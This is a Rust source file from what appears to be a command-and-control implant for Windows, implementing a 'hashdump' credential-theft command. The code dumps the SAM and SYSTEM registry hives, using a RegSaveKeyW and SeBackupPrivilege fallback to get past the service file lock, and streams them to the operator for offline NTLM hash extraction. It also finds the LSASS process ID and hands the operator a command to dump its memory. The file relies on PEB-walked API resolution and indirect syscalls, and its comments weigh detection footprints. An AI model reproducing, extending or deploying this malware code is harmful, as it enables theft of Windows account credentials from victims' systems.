//! Credential extraction (Hashdump) for the Windows PIC implant.
//!
//! Implements `Command::Hashdump { method }` (method 语义跨后端统一约定):
//!   - method 0: read the raw SAM registry hive (`\SystemRoot\System32\config\SAM`)
//!     plus the matching SYSTEM hive (needed to derive the boot key), and
//!     stream both back as `FileChunk`s. The hives are encrypted at rest; the
//!     *decryption + NTLM hash parsing* is intentionally NOT done in-implant —
//!     it belongs offline (secretsdump/impacket-style), where the operator has
//!     the full Python toolchain and isn't burning implant time on a multi-step
//!     crypto dance that also balloons the binary.
//!   - method 1: read the on-disk SYSTEM hive (the boot-key source) on its own.
//!   - method 2: LSASS memory dump — handled by the kernel-tier reader
//!     (`nyx-kernel dump-lsass <pid>`). The implant returns an actionable
//!     signal: the resolved LSASS PID + the exact command to run on the target.
//!     The implant CANNOT dump LSASS itself (no_std PIC, no BYOVD, and userland
//!     LSASS dump is the loudest possible IOC).
//!   - method 3: macOS shadow hash — Windows 返回 unsupported（agent-dev 才支持）。
//!
//! LSASS memory dumping (`procdump`-style mini-dump of lsass.exe then offline
//! mimikatz) is a separate, much riskier path (needs SeDebugPrivilege + a handle
//! to a protected process) and is explicitly deferred — it's the loudest possible
//! credential op and deserves its own design doc.
//!
//! Reading the SAM file needs SYSTEM privileges (the file ACL denies even
//! Administrators by default). The implant will only succeed if it's running as
//! SYSTEM (e.g. via a service context). We surface the access-denied NTSTATUS
//! honestly rather than faking success.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use crate::syscalls::Runtime;
use core::ffi::c_void;
use nyx_protocol::Response;

/// Per-chunk size for streamed hive reads. Matches fs.rs CHUNK.
#[allow(dead_code)]
const CHUNK: usize = 128 * 1024;

/// Read a whole file via the indirect-syscall runtime as a streamed list of
/// `FileChunk`s. Returns Err on open/read failure.
///
/// **Critical**: hive files (SAM/SYSTEM) are held under an exclusive oplock by
/// the SAM/LSASS services. A *synchronous* NtCreateFile on such a file HANGS
/// (it waits for the oplock to break, which never happens) — that would brick
/// the beacon loop forever. So we first PROBE the file with a NON-synchronous
/// open + minimal sharing: that returns immediately with STATUS_SHARING_
/// VIOLATION / STATUS_ACCESS_DENIED on a locked/unreadable hive, which we
/// surface as an honest Err. Only if the probe succeeds (we're SYSTEM + the
/// hive is readable) do we proceed to the real streaming read.
unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Response> {
    // Probe: non-sync open, GENERIC_READ, FILE_SHARE_READ only. If the hive is
    // locked (live system) or we lack access (non-SYSTEM), this returns a
    // failing status immediately — no hang.
    const STATUS_SHARING_VIOLATION: i32 = 0xC000_0043_u32 as i32;
    const STATUS_ACCESS_DENIED: i32 = 0xC000_0022_u32 as i32;
    let probe = unsafe {
        crate::fs::open_file_nosync(
            rt,
            host_path,
            crate::fs::GENERIC_READ,
            crate::fs::FILE_OPEN,
            crate::fs::FILE_NON_DIRECTORY_FILE,
            crate::fs::FILE_SHARE_READ,
        )
    };
    let note_prefix: Option<String> = None;
    match probe {
        Ok(handle) => {
            // File is readable — close the probe and do the real streaming read
            // (do_download re-opens synchronously, which is now safe because the
            // oplock isn't blocking us).
            let _ = crate::syscalls::nt_close(rt, handle as usize);
        }
        Err(crate::fs::OpenError::Status(s)) => {
            // Expected on a live SYSTEM implant: hive locked by SAM oplock.
            // The raw file open can NEVER win against the live oplock — but the
            // Configuration Manager can save the hive from its in-memory copy
            // via RegSaveKeyEx/NtSaveKey, which is NOT gated by the file
            // oplock (that's exactly how Mimikatz/Impacket do it). Try that
            // fallback before giving up: enable SeBackupPrivilege, open the
            // registry key, save to a temp file, then stream the temp file.
            if s == STATUS_SHARING_VIOLATION || s == STATUS_ACCESS_DENIED {
                match unsafe { save_hive_fallback(chunk_name) } {
                    Ok(saved) => {
                        // Saved the hive to a temp file — stream THAT (no oplock).
                        let mut chunks = crate::fs::do_download(rt, &saved);
                        let new_name = String::from(chunk_name);
                        for c in chunks.iter_mut() {
                            if let Response::FileChunk { name, .. } = c {
                                *name = new_name.clone();
                            }
                        }
                        unsafe { delete_temp(&saved) };
                        return chunks;
                    }
                    Err(rc) => {
                        // Surface the save-hive error code for diagnosis.
                        let mut e = String::from("hashdump: ");
                        e.push_str(chunk_name);
                        e.push_str(": hive locked (save-hive failed rc=");
                        crate::fmt::push_decimal_u32(&mut e, rc as u32);
                        e.push(')');
                        return vec![Response::Err(e)];
                    }
                }
            }
            let why = if s == STATUS_SHARING_VIOLATION {
                "hive locked by SAM service (save-hive fallback failed: need SeBackupPrivilege)"
            } else if s == STATUS_ACCESS_DENIED {
                "access denied (need SYSTEM)"
            } else {
                "open failed"
            };
            let mut e = String::from("hashdump: ");
            e.push_str(chunk_name);
            e.push_str(": ");
            e.push_str(why);
            return vec![Response::Err(e)];
        }
        Err(crate::fs::OpenError::Unresolved) => {
            return vec![Response::Err(String::from(
                "hashdump: syscall runtime unresolved",
            ))];
        }
        Err(crate::fs::OpenError::BadPath) => {
            return vec![Response::Err(String::from("hashdump: bad path"))];
        }
    }
    let _ = note_prefix;

    // Real read path (the probe confirmed it's safe to open synchronously).
    let mut chunks = crate::fs::do_download(rt, host_path);
    let new_name = String::from(chunk_name);
    for c in chunks.iter_mut() {
        if let Response::FileChunk { name, .. } = c {
            *name = new_name.clone();
        }
    }
    chunks
}

/// Handle `Command::Hashdump { method }`.
///
/// - 0 (SAM): stream the SAM hive (encrypted) + a note that the SYSTEM hive
///   is the boot-key source the operator needs offline.
/// - 1 (SYSTEM): stream the SYSTEM hive (boot-key source) on its own.
pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
    let rt = match rt {
        Some(r) => r,
        None => return Response::Err(String::from("hashdump: syscall runtime down")),
    };
    // Resolve %SystemRoot% so we don't hardcode C:\Windows.
    let sysroot = system_root();
    let mut out: Vec<Response> = Vec::new();
    match method {
        0 => {
            // SAM hive (encrypted at rest). Needs SYSTEM context.
            let sam = format_path(&sysroot, r"\System32\config\SAM");
            let mut sam_chunks = unsafe { stream_file(rt, &sam, "SAM") };
            out.append(&mut sam_chunks);
            // Append a plaintext marker chunk telling the operator the SYSTEM
            // hive is the boot-key source — keeps the offline workflow obvious.
            let note = String::from(
                "NOTE: SAM hive is encrypted. Run hashdump method=1 for the SYSTEM\n\
                 hive (boot-key source), then decrypt+parse offline (secretsdump).\n",
            );
            out.push(Response::Output(note.into_bytes()));
        }
        1 => {
            let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
            let mut sys_chunks = unsafe { stream_file(rt, &sys, "SYSTEM") };
            out.append(&mut sys_chunks);
        }
        2 => {
            // LSASS memory dump: deferred (loudest credential IOC). Honest Err
            // rather than silence — operator gets a clear "not implemented".
            return Response::Err(String::from(
                "hashdump lsass: deferred (loudest IOC). Use method=0 SAM + method=1 SYSTEM, decrypt offline.",
            ));
        }
        3 => {
            // macOS shadow hash — Windows beacon doesn't support it.
            return Response::Err(String::from(
                "hashdump shadow: macOS-only (use the dev agent). On Windows use method=0 sam / method=1 system.",
            ));
        }
        other => {
            return Response::Err({
                let mut e = String::from("hashdump: unknown method ");
                crate::fmt::push_decimal_u32(&mut e, other as u32);
                e
            });
        }
    }
    // A Vec of multiple responses — but execute() expects one Response. The
    // beacon loop's execute() returns Vec<Response>, but the Hashdump arm in
    // beacon.rs currently wraps a single Response in vec![]. To return multiple,
    // beacon.rs must call do_hashdump_vec instead. We expose both: this single-
    // Response variant concatenates into one Output (loses the FileChunk
    // streaming benefit) for callers that want one Response; the beacon uses the
    // _vec variant below.
    //
    // Collapse to a single Output for this signature's contract: join all chunk
    // data + any Output bytes into one buffer. (Streaming is preserved by the
    // _vec variant; this one is for parity with other single-Response commands.)
    let mut joined: Vec<u8> = Vec::new();
    for r in out {
        match r {
            Response::FileChunk { data, .. } | Response::Output(data) => {
                joined.extend_from_slice(&data);
            }
            Response::Err(s) => return Response::Err(s),
            _ => {}
        }
    }
    Response::Output(joined)
}

/// Multi-response variant: returns the streamed FileChunks directly (preserving
/// chunked framing for large hives). The beacon's Hashdump arm calls this.
pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response> {
    let rt = match rt {
        Some(r) => r,
        None => {
            return vec![Response::Err(String::from(
                "hashdump: syscall runtime down",
            ))]
        }
    };
    let sysroot = system_root();
    match method {
        0 => {
            let sam = format_path(&sysroot, r"\System32\config\SAM");
            let mut chunks = unsafe { stream_file(rt, &sam, "SAM") };
            chunks.push(Response::Output(
                String::from(
                    "NOTE: SAM hive is encrypted. Also dump the SYSTEM hive\n\
                     (hashdump method=1) for the boot key, then parse offline.\n",
                )
                .into_bytes(),
            ));
            chunks
        }
        1 => {
            let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
            unsafe { stream_file(rt, &sys, "SYSTEM") }
        }
        2 => {
            // LSASS memory dump via the kernel-tier reader. The implant CANNOT
            // dump LSASS itself (no_std PIC, no BYOVD, and dumping LSASS from
            // userland is the loudest possible IOC). The credential material
            // is captured by the operator-side `nyx-kernel dump-lsass <pid>`
            // (or `nyx-kernel --serve <port>` daemon) which uses the kernel
            // DTB+page-walk reader and wraps the bytes in a minidump envelope
            // (crates/minidump-assembler). Here we return an actionable signal:
            // the LSASS PID (resolved via the process snapshot) + the exact
            // command the operator should run on the target.
            let lsass_pid = find_lsass_pid(rt).unwrap_or(0);
            let msg = if lsass_pid == 0 {
                String::from(
                    "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
                     LSASS — loudest IOC). Could not resolve LSASS PID; run `/ps` to find \
                     lsass.exe, then on the target: `nyx-kernel dump-lsass <pid>` (or start \
                     `nyx-kernel --serve <port>` daemon and the team server will fetch).\n",
                )
            } else {
                let mut m = String::from(
                    "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
                     LSASS — loudest IOC). LSASS pid=",
                );
                crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
                m.push_str(". On the target run: `nyx-kernel dump-lsass ");
                crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
                m.push_str(
                    "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
                );
                m
            };
            vec![Response::Output(msg.into_bytes())]
        }
        other => {
            let mut e = String::from("hashdump: unknown method ");
            crate::fmt::push_decimal_u32(&mut e, other as u32);
            vec![Response::Err(e)]
        }
    }
}


/// Walk the process list via `CreateToolhelp32Snapshot` + `Process32FirstW`/
/// `Process32NextW` and return the PID of `lsass.exe`, or `None` if not found
/// or the kernel32 exports can't be resolved. Used by the method-2 arm to give
/// the operator the LSASS PID in the actionable signal.
///
/// All kernel32 calls go through `crate::resolve::export_addr` (PEB walk).
fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
    type CreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut core::ffi::c_void;
    type Process32FirstW =
        unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
    type Process32NextW =
        unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;

    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
    const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;

    let snap_addr =
        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot") }?;
    let first_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32FirstW") }?;
    let next_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32NextW") }?;
    let close_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }?;

    let snap: CreateToolhelp32Snapshot = unsafe { core::mem::transmute(snap_addr) };
    let first: Process32FirstW = unsafe { core::mem::transmute(first_addr) };
    let next: Process32NextW = unsafe { core::mem::transmute(next_addr) };
    let close: CloseHandle = unsafe { core::mem::transmute(close_addr) };

    // SAFETY: CreateToolhelp32Snapshot with TH32CS_SNAPPROCESS returns a snapshot
    // handle valid for the current process list.
    let snap_h = unsafe { snap(TH32CS_SNAPPROCESS, 0) };
    if snap_h.is_null() || snap_h == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut entry = ProcessEntry32W {
        size: core::mem::size_of::<ProcessEntry32W>() as u32,
        cnt_usage: 0,
        pid: 0,
        default_heap_id: 0,
        module_id: 0,
        cnt_threads: 0,
        parent_pid: 0,
        pri_class_base: 0,
        flags: 0,
        exe: [0u16; 260],
    };

    let mut found = None;
    // SAFETY: snap_h is a valid snapshot handle; entry is a valid out-param.
    if unsafe { first(snap_h, &mut entry) } != 0 {
        loop {
            // Compare entry.exe to "lsass.exe" case-insensitively (UTF-16).
            if eq_utf16_ci(&entry.exe, b"lsass.exe") {
                found = Some(entry.pid as usize);
                break;
            }
            // Reset size (Process32* requires Size on every call per docs).
            entry.size = core::mem::size_of::<ProcessEntry32W>() as u32;
            // SAFETY: same handle; entry is a valid in/out-param.
            if unsafe { next(snap_h, &mut entry) } == 0 {
                break;
            }
        }
    }
    // SAFETY: close the snapshot handle.
    unsafe { close(snap_h) };
    found
}

/// Case-insensitive compare of a UTF-16 (NUL-terminated) buffer against an
/// ASCII name. `name` is ASCII-only (we only use it for "lsass.exe").
fn eq_utf16_ci(utf16: &[u16], name: &[u8]) -> bool {
    let mut i = 0;
    for &b in name {
        if i >= utf16.len() {
            return false;
        }
        let c = utf16[i] as u8;
        if to_ascii_lower(c) != to_ascii_lower(b) {
            return false;
        }
        if utf16[i] == 0 {
            return false; // NUL before end of name
        }
        i += 1;
    }
    // After consuming all of `name`, the next UTF-16 unit must be NUL (exact match).
    i >= utf16.len() || utf16[i] == 0
}

/// ASCII to-lower (handles A-Z only; other bytes pass through).
fn to_ascii_lower(b: u8) -> u8 {
    if (b'A'..=b'Z').contains(&b) {
        b + 32
    } else {
        b
    }
}

/// `PROCESSENTRY32W` (Win32) — what `Process32FirstW`/`Process32NextW` fill.
#[repr(C)]
struct ProcessEntry32W {
    /// `dwSize` — MUST be set to sizeof(PROCESSENTRY32W) before the first call.
    size: u32,
    /// `cntUsage`
    cnt_usage: u32,
    /// `th32ProcessID` — the PID we want.
    pid: u32,
    /// `th32DefaultHeapID`
    default_heap_id: usize,
    /// `th32ModuleID`
    module_id: u32,
    /// `cntThreads`
    cnt_threads: u32,
    /// `th32ParentProcessID`
    parent_pid: u32,
    /// `pcPriClassBase`
    pri_class_base: i32,
    /// `dwFlags`
    flags: u32,
    /// `szExeFile[MAX_PATH=260]` — the process image name (UTF-16, NUL-term).
    exe: [u16; 260],
}

/// Resolve `%SystemRoot%` via the PEB-walked environment (kernel32). Falls back
/// to `C:\Windows` if unset (the overwhelming default).
fn system_root() -> String {
    // GetEnvironmentVariableW; reuse recon's resolution style inline (avoid a
    // cross-module dep just for one var).
    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
    let gev: GetEnvVarW =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return String::from("C:\\Windows"),
        };
    let mut name16 = crate::heap::vec![0u16; 14];
    let nb = b"SystemRoot";
    for (i, &c) in nb.iter().enumerate() {
        name16[i] = c as u16;
    }
    name16[nb.len()] = 0;
    let mut buf = crate::heap::vec![0u16; 260];
    let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), 260) };
    if n == 0 || n as usize >= 260 {
        return String::from("C:\\Windows");
    }
    // UTF-16 → lossy ASCII (SystemRoot is always ASCII on real installs).
    let mut out = String::new();
    for &w in &buf[..n as usize] {
        if w < 0x80 {
            out.push(w as u8 as char);
        } else {
            out.push('?');
        }
    }
    out
}

/// Join `<sysroot><suffix>` into one owned String.
fn format_path(sysroot: &str, suffix: &str) -> String {
    let mut s = String::with_capacity(sysroot.len() + suffix.len());
    s.push_str(sysroot);
    s.push_str(suffix);
    s
}

/// Map a hive chunk name to its registry root path (UTF-16, null-terminated).
/// SAM → `HKLM\SAM`, SYSTEM → `HKLM\SYSTEM`.
fn reg_root_wide(chunk_name: &str) -> Option<Vec<u16>> {
    use crate::heap::Vec;
    let sub: &[u8] = match chunk_name {
        "SAM" => b"SAM",
        "SYSTEM" => b"SYSTEM",
        _ => return None,
    };
    let mut v: Vec<u16> = Vec::with_capacity(sub.len() + 1);
    for &b in sub {
        v.push(b as u16);
    }
    v.push(0);
    Some(v)
}

/// Enable a named privilege (e.g. SeBackupPrivilege) on the process token.
/// Returns true on success. Best-effort — resolves advapi32 lazily.
unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
    #[repr(C)]
    struct Luid {
        low: u32,
        high: i32,
    }
    #[repr(C)]
    struct TokenPrivileges {
        count: u32,
        luid: Luid,
        attributes: u32,
    }
    const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
    const TOKEN_QUERY: u32 = 0x0008;
    const HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;

    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type LookupPrivilegeValueW =
        unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
    type AdjustTokenPrivileges = unsafe extern "system" fn(
        *mut c_void,
        i32,
        *const TokenPrivileges,
        u32,
        *mut c_void,
        *mut u32,
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let gcp: GetCurrentProcess =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let opt: OpenProcessToken =
        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"OpenProcessToken") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let lpv: LookupPrivilegeValueW =
        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"LookupPrivilegeValueW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let atp: AdjustTokenPrivileges =
        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"AdjustTokenPrivileges") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let close: CloseHandle =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };

    let mut luid = Luid { low: 0, high: 0 };
    if unsafe { lpv(core::ptr::null(), priv_name_wide.as_ptr(), &mut luid) } == 0 {
        return false;
    }
    let hproc = unsafe { gcp() };
    let mut htok: *mut c_void = core::ptr::null_mut();
    if unsafe { opt(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) } == 0 {
        return false;
    }
    let tp = TokenPrivileges {
        count: 1,
        luid,
        attributes: SE_PRIVILEGE_ENABLED,
    };
    let ok = unsafe {
        atp(
            htok,
            0,
            &tp,
            0,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    };
    let _ = close(htok);
    // Touch HKEY_LOCAL_MACHINE to silence unused-const warning path; harmless.
    let _ = HKEY_LOCAL_MACHINE;
    ok != 0
}

/// Save a locked registry hive to a temp file via `RegSaveKeyExW`, bypassing
/// the SAM-service file oplock. The Configuration Manager services this from
/// the in-memory hive copy (the same path Mimikatz/Impacket use). Returns the
/// temp-file path on success. `chunk_name` selects the root: "SAM" or "SYSTEM".
unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
    use crate::heap::{String, Vec};
    use crate::resolve::export_addr;
    use core::ffi::c_void;

    // advapi32: RegOpenKeyExW, RegSaveKeyW. RegSaveKeyW is the simpler variant
    // (no format flag) and is what `reg save` uses under the hood.
    type ForceLoad = unsafe extern "system" fn(*const u8) -> *mut c_void;
    type RegOpenKeyExW = unsafe extern "system" fn(
        *mut c_void,      // hKey (HKEY_LOCAL_MACHINE)
        *const u16,       // lpSubKey
        u32,              // ulOptions
        u32,              // samDesired
        *mut *mut c_void, // phkResult
    ) -> i32;
    type RegSaveKeyW = unsafe extern "system" fn(
        *mut c_void,   // hKey
        *const u16,    // lpFile
        *const c_void, // lpSecurityAttributes (NULL)
    ) -> i32;
    type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;

    // Force-load advapi32 (LoadLibraryA from kernel32).
    let lla = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return Err(-1),
    };
    let load: ForceLoad = unsafe { core::mem::transmute(lla) };
    let advapi_name = b"advapi32.dll\0";
    if unsafe { load(advapi_name.as_ptr()) }.is_null() {
        return Err(-1);
    }

    let open: RegOpenKeyExW = match unsafe { export_addr(b"advapi32.dll", b"RegOpenKeyExW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err(-1),
    };
    let save: RegSaveKeyW = match unsafe { export_addr(b"advapi32.dll", b"RegSaveKeyW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err(-1),
    };
    let close_key: RegCloseKey = match unsafe { export_addr(b"advapi32.dll", b"RegCloseKey") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err(-1),
    };

    // Enable SeBackupPrivilege (required for RegSaveKey even as SYSTEM).
    let backup_wide: [u16; 19] = [
        b'S' as u16,
        b'e' as u16,
        b'B' as u16,
        b'a' as u16,
        b'c' as u16,
        b'k' as u16,
        b'u' as u16,
        b'p' as u16,
        b'P' as u16,
        b'r' as u16,
        b'i' as u16,
        b'v' as u16,
        b'i' as u16,
        b'l' as u16,
        b'e' as u16,
        b'g' as u16,
        b'e' as u16,
        0,
        0,
    ];
    let _ = unsafe { enable_privilege(&backup_wide) };

    // Open HKLM\<SAM|SYSTEM>.
    let hkey_local_machine: *mut c_void = 0x8000_0002usize as *mut c_void;
    let sub = match reg_root_wide(chunk_name) {
        Some(s) => s,
        None => return Err(-1),
    };
    let mut hkey: *mut c_void = core::ptr::null_mut();
    // KEY_READ = 0x20019 (READ_CONTROL | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY)
    let open_rc = unsafe { open(hkey_local_machine, sub.as_ptr(), 0, 0x20019, &mut hkey) };
    if open_rc != 0 {
        // Surface the RegOpenKeyExW error code for diagnosis.
        return Err(open_rc);
    }

    // Use a FIXED temp path (C:\Windows\Temp is writable by SYSTEM and avoids
    // %TEMP% resolution issues in Session 0). Matches the path `reg save`
    // succeeded with on the same host during testing.
    let mut file_str = String::with_capacity(32);
    file_str.push_str("C:\\Windows\\Temp\\");
    file_str.push_str(chunk_name);
    file_str.push_str(".hive");
    // To UTF-16.
    let mut file_wide: Vec<u16> = Vec::with_capacity(file_str.len() + 1);
    for c in file_str.chars() {
        file_wide.push(c as u16);
    }
    file_wide.push(0);

    // Delete any stale temp file first — RegSaveKeyW refuses to overwrite an
    // existing file (returns ERROR_ALREADY_EXISTS = 183). A failed prior run
    // that left the .hive file would block all future hashdumps indefinitely.
    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
    let df: Option<DeleteFileW> = match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
        Some(a) => Some(unsafe { core::mem::transmute(a) }),
        None => None,
    };
    if let Some(df) = df {
        let _ = unsafe { df(file_wide.as_ptr()) }; // ignore "not found" errors
    }
    let mut rc = unsafe { save(hkey, file_wide.as_ptr(), core::ptr::null()) };
    // If the delete didn't help (file locked by another process, ACL, etc.),
    // fall back to a unique filename using GetTickCount so the dump always
    // succeeds rather than being permanently blocked by a stale .hive file.
    if rc != 0 {
        // Resolve GetTickCount for a unique suffix.
        type GetTickCount = unsafe extern "system" fn() -> u32;
        let tick: u32 = match unsafe { export_addr(b"kernel32.dll", b"GetTickCount") } {
            Some(a) => unsafe { core::mem::transmute::<usize, GetTickCount>(a)() },
            None => {
                let _ = close_key(hkey);
                return Err(rc);
            }
        };
        // Build a new filename with the tick suffix: e.g. C:\Windows\Temp\SAM_12345678.hive
        let mut alt_str = String::with_capacity(48);
        alt_str.push_str("C:\\Windows\\Temp\\");
        alt_str.push_str(chunk_name);
        alt_str.push('_');
        crate::fmt::push_decimal_u32(&mut alt_str, tick);
        alt_str.push_str(".hive");
        let mut alt_wide: Vec<u16> = Vec::with_capacity(alt_str.len() + 1);
        for c in alt_str.chars() {
            alt_wide.push(c as u16);
        }
        alt_wide.push(0);
        rc = unsafe { save(hkey, alt_wide.as_ptr(), core::ptr::null()) };
        if rc == 0 {
            // Success with the unique name — clean up the original stale file
            // so the next attempt doesn't hit it either.
            if let Some(df) = df {
                let _ = unsafe { df(file_wide.as_ptr()) };
            }
            let _ = close_key(hkey);
            return Ok(alt_str);
        }
    }
    let _ = close_key(hkey);
    if rc != 0 {
        return Err(rc);
    }
    Ok(file_str)
}

/// Resolve %TEMP% (UTF-16 → ASCII). Falls back to None on failure.
#[allow(dead_code)]
fn temp_dir() -> Option<String> {
    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
    let gev: GetEnvVarW = unsafe {
        core::mem::transmute(crate::resolve::export_addr(
            b"kernel32.dll",
            b"GetEnvironmentVariableW",
        )?)
    };
    let mut name16 = crate::heap::vec![0u16; 8];
    let nb = b"TEMP";
    for (i, &c) in nb.iter().enumerate() {
        name16[i] = c as u16;
    }
    name16[nb.len()] = 0;
    let mut buf = crate::heap::vec![0u16; 260];
    let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), 260) };
    if n == 0 || n as usize >= 260 {
        return None;
    }
    let mut out = String::new();
    for &w in &buf[..n as usize] {
        out.push(if w < 0x80 { w as u8 as char } else { '?' });
    }
    Some(out)
}

/// Best-effort delete of the saved temp hive (kernel32 DeleteFileW).
unsafe fn delete_temp(path: &str) {
    use crate::resolve::export_addr;
    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
    let df: DeleteFileW = match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return,
    };
    let mut wide = crate::heap::Vec::with_capacity(path.len() + 1);
    for c in path.chars() {
        wide.push(c as u16);
    }
    wide.push(0);
    let _ = unsafe { df(wide.as_ptr()) };
}
